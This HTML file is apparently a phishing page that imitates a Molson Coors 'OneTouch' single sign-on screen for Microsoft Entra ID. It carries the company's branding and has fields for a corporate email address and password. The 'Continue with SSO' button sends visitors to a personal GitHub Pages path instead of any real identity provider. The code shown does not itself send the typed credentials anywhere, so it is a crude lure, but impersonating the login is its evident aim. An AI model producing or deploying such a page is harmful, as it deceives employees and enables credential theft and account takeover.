<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OneTouch SSO</title>
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
<style>
:root{--brand:#4f46e5;--ink:#111827;--muted:#6b7280;--line:#e5e7eb;--bad:#dc2626;--ok:#15803d}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
  min-height:100vh;color:var(--ink);background:#fff;-webkit-text-size-adjust:100%}
a{color:var(--brand);text-decoration:none;font-weight:600}
a:hover{text-decoration:underline}
input,select,button{font:inherit}
:focus-visible{outline:2px solid var(--brand);outline-offset:2px}

body{display:grid;grid-template-columns:minmax(0,1fr);place-items:start center;padding-top: 0;
  padding-bottom: 28px;min-height:100vh;background:#718aee}
img[src="molsoncoorslogo.png"]{display:block;margin-top:48px;margin-bottom:0;padding:0}
.box{width:100%;max-width:400px;background:#fff;border:1px solid var(--line);border-radius:16px;
  padding:38px 34px;box-shadow:0 10px 34px rgba(17,24,39,.06)}
.mark{width:42px;height:42px;border-radius:12px;background:var(--brand);display:grid;place-items:center;
  color:#fff;font-weight:800;margin-bottom:22px}
h1{font-size:1.4rem;letter-spacing:-.02em;margin-bottom:7px}
.sub{color:var(--muted);font-size:.93rem;line-height:1.6;margin-bottom:26px}
label{display:block;font-size:.85rem;font-weight:600;margin-bottom:6px}
.field{width:100%;padding:12px 14px;border:1px solid var(--line);border-radius:10px;font-size:.95rem;
  transition:border-color .15s,box-shadow .15s;background:#fff;color:inherit}
.field:focus{outline:none;border-color:var(--brand);box-shadow:0 0 0 3px rgba(79,70,229,.15)}
.btn{width:100%;padding:13px;border:0;border-radius:10px;background:var(--brand);color:#fff;
  font-size:.97rem;font-weight:700;cursor:pointer;transition:background .15s}
.btn:hover{background:#4338ca}

.box{max-width:430px}
.combo{display:flex;align-items:center;border:1px solid var(--line);border-radius:10px;
  overflow:hidden;transition:border-color .15s,box-shadow .15s;background:#fff}
.combo:focus-within{border-color:var(--brand);box-shadow:0 0 0 3px rgba(79,70,229,.15)}
.combo input{flex:1;min-width:0;border:0;padding:12px 4px 12px 14px;font-size:.95rem;background:none}
.combo input:focus{outline:none}
.combo .suffix{padding:12px 14px 12px 2px;color:var(--muted);font-size:.95rem;white-space:nowrap;
  background:#f5f6fa;align-self:stretch;display:flex;align-items:center;border-left:1px solid var(--line)}
.provs{display:grid;gap:9px;margin:24px 0 0}
.prov{display:flex;align-items:center;gap:11px;padding:12px 14px;border:1px solid var(--line);
  border-radius:11px;background:#fff;font-size:.92rem;font-weight:600;color:var(--ink);cursor:pointer;
  text-align:left;transition:background .15s,border-color .15s}
.prov:hover{background:#f5f6fa;border-color:#cbd0dd}
.prov .ic{width:24px;height:24px;border-radius:6px;display:grid;place-items:center;font-size:.68rem;
  font-weight:800;color:#fff;flex-shrink:0}
.or{display:flex;align-items:center;gap:14px;margin:24px 0 4px;color:var(--muted);font-size:.8rem;
  letter-spacing:.08em;text-transform:uppercase}
.or::before,.or::after{content:"";flex:1;height:1px;background:var(--line)}
@media(max-width:400px){.combo .suffix{font-size:.85rem;padding-left:6px;padding-right:10px}}

@media(prefers-reduced-motion:reduce){*,*::before,*::after{transition:none!important;animation:none!important}}
</style>
</head>
<body>
<img src="molsoncoorslogo.png" type="png" alt="Molson Coors" href="/molsoncoorslogo.png" padding="10px">
<main class="box">
<img src="favicon-32x32.png" type="png" sizes="32x32" href="/favicon-32x32.png">
  <h1>Sign in to OneTouch</h1>
  <p class="sub">Enter your Microsoft Entra ID email</p>
  <form onsubmit="event.preventDefault()">
    <label for="team">Microsoft Entra ID email</label>
    <div class="combo">
      <input id="team" type="text" placeholder="your-email" autocomplete="organization" required
             spellcheck="false" autocapitalize="off">
      <span class="suffix">@molsoncoors.com</span>
    </div>
       <div class="combo">
      <input id="team" type="text" placeholder="your-password" autocomplete="current-password" required
             spellcheck="false" autocapitalize="off">
    </div>
    <button class="btn" type="submit" style="margin-top:20px" onclick="location.href='vperez-stars.github.io/datatool/database';">Continue with SSO</button>
  </form>
  <div class="or"><span>or use</span></div>
  <div class="provs">
    <button class="prov" type="button"><img src="microsoftlogo.png" alt="Microsoft" height="24" width="24"> Microsoft Entra ID</button>
  </div>
  <p class="foot">Forgot your email or password? <a href="#">Contact Support</a></p>
</main>

</body>
</html>
